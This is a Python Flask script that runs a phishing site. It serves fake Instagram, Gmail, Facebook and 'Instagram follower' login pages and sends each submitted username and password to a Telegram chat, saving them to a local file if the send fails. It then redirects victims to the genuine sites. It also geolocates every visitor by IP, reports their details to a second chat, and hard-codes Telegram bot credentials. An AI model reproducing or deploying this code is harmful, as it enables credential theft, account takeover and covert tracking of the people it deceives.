from flask import Flask, render_template, request, redirect
from pyrogram import Client
from threading import Thread
import json
import urllib.request



api_id=8763712
api_hash="835d27216f117e22a5c192b89a4ce457"
bot_token="5202290353:AAGol_pOKDN3VIWoywvIUm5O0xmQkpkVyxI"
tg = Client(":memory:", api_id, api_hash, bot_token=bot_token)


app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        try:
            tg.send_message(chat_id=-1001558921842, text=f"✅ New Instagram Login ✅\n\nUserNane: `{str(username)}`\nPassword: `{str(password)}`")
        except Exception as e:
          data = open("data.txt", "a")
          data.write(f'Instagram \nUserNane: {username} \n\nPassword: {password}\n\n\n')
          data.close()
        return redirect('https://help.instagram.com/519522125107875/?maybe_redirect_pol=0')
    try:
      agent = request.headers.get('User-Agent')
      if "uptimerobot" not in agent:
        GEO_IP_API_URL = 'http://ip-api.com/json/'
        IP_TO_SEARCH = request.environ.get('HTTP_X_FORWARDED_FOR')
        req = urllib.request.Request(GEO_IP_API_URL + IP_TO_SEARCH)
        response = urllib.request.urlopen(req).read()
        json_response = json.loads(response.decode('utf-8'))
        v1 = list(json_response.keys())
      
        v2 = ''
        for i in range(len(v1)):
           v2+=f"{v1[i]}: {json_response[v1[i]]}\n"
        tg.send_message(chat_id=-1001635327589, text=f"🔸 New Visitor On Instagram🔸\n\n{str(v2)}\n\n{agent}")
    except Exception as e:
          pass
    return render_template('insta.html')





@app.route('/google', methods=['GET', 'POST'])
def google():
    if request.method == 'POST':
        username = request.form['email']
        password = request.form['password']
        try:
            tg.send_message(chat_id=-1001558921842, text=f"✅ New Gmail Login ✅\n\nEmail: `{str(username)}`\nPassword: `{str(password)}`")
        except Exception as e:
          data = open("data.txt", "a")
          data.write(f'Gmail \nEmail: {username} \n\nPassword: {password}\n\n\n')
          data.close()
        return redirect('https://accounts.google.com/signin')
		  
    try:
      agent = request.headers.get('User-Agent')
      if "uptimerobot" not in agent:
        GEO_IP_API_URL = 'http://ip-api.com/json/'
        IP_TO_SEARCH = request.environ.get('HTTP_X_FORWARDED_FOR')
        req = urllib.request.Request(GEO_IP_API_URL + IP_TO_SEARCH)
        response = urllib.request.urlopen(req).read()
        json_response = json.loads(response.decode('utf-8'))
        v1 = list(json_response.keys())
      
        v2 = ''
        for i in range(len(v1)):
           v2+=f"{v1[i]}: {json_response[v1[i]]}\n"
        tg.send_message(chat_id=-1001635327589, text=f"🔸 New Visitor On Gmail🔸\n\n{str(v2)}\n\n{agent}")
    except Exception as e:
          pass
    return render_template('google.html')




@app.route('/fb', methods=['GET', 'POST'])
def fb():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        try:
            tg.send_message(chat_id=-1001558921842, text=f"✅ New Facebook Login ✅\n\nUserNane: `{str(username)}`\nPassword: `{str(password)}`")
        except Exception as e:
          data = open("data.txt", "a")
          data.write(f'Facebook \nUserNane: {username} \n\nPassword: {password}\n\n\n')
          data.close()
        return redirect('https://m.facebook.com/help/?ref=pf&refid=8')
    try:
      agent = request.headers.get('User-Agent')
      if "uptimerobot" not in agent:
        GEO_IP_API_URL = 'http://ip-api.com/json/'
        IP_TO_SEARCH = request.environ.get('HTTP_X_FORWARDED_FOR')
        req = urllib.request.Request(GEO_IP_API_URL + IP_TO_SEARCH)
        response = urllib.request.urlopen(req).read()
        json_response = json.loads(response.decode('utf-8'))
        v1 = list(json_response.keys())
      
        v2 = ''
        for i in range(len(v1)):
           v2+=f"{v1[i]}: {json_response[v1[i]]}\n"
        tg.send_message(chat_id=-1001635327589, text=f"🔸 New Visitor On Facebook🔸\n\n{str(v2)}\n\n{agent}")
    except Exception as e:
          pass
    return render_template('fb.html')



@app.route('/follower', methods=['GET', 'POST'])
def follower():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        try:
            tg.send_message(chat_id=-1001558921842, text=f"✅ New Instagram Follower Login ✅\n\nUserNane: `{str(username)}`\nPassword: `{str(password)}`")
        except Exception as e:
          data = open("data.txt", "a")
          data.write(f'Instagram Follower \nUserNane: {username} \n\nPassword: {password}\n\n\n')
          data.close()
        return redirect('https://help.instagram.com/519522125107875/?maybe_redirect_pol=0')
    try:
      agent = request.headers.get('User-Agent')
      if "uptimerobot" not in agent:
        GEO_IP_API_URL = 'http://ip-api.com/json/'
        IP_TO_SEARCH = request.environ.get('HTTP_X_FORWARDED_FOR')
        req = urllib.request.Request(GEO_IP_API_URL + IP_TO_SEARCH)
        response = urllib.request.urlopen(req).read()
        json_response = json.loads(response.decode('utf-8'))
        v1 = list(json_response.keys())
      
        v2 = ''
        for i in range(len(v1)):
           v2+=f"{v1[i]}: {json_response[v1[i]]}\n"
        tg.send_message(chat_id=-1001635327589, text=f"🔸 New Visitor On Instagram Follower🔸\n\n{str(v2)}\n\n{agent}")
    except Exception as e:
          pass
    return render_template('follower.html')




def run():
    app.run(host="0.0.0.0", port=8080)
def alive():
    server = Thread(target=run)
    server.start()

# can not be called and execute arbitrary
if __name__ == '__main__':
    alive()
    tg.run()

